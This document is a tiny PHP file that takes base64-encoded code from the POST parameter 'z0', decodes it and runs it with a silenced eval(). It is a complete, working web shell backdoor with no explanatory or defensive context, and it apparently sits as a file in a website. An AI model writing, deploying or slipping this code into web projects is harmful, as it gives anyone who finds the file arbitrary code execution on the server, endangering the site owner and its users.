<?php

$code = base64_decode($_POST['z0']);
@eval($code);

?>